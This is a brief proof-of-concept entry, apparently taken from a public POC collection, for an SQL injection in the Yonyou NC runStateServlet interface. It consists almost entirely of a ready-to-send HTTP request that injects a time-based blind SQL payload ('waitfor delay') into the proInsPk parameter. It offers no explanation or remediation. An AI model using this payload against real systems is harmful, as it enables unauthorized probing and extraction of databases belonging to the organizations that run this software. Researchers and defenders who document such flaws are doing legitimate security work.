# yonyounc_runStateServlet_sqli

from: https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BNC-runStateServlet%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md

2024.4.15@2

```
GET /portal/pt/servlet/runStateServlet/doPost?pageId=login&proInsPk=1'waitfor+delay+'0:0:6'-- HTTP/1.1
Host: 192.168.63.129:8088
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 19

```
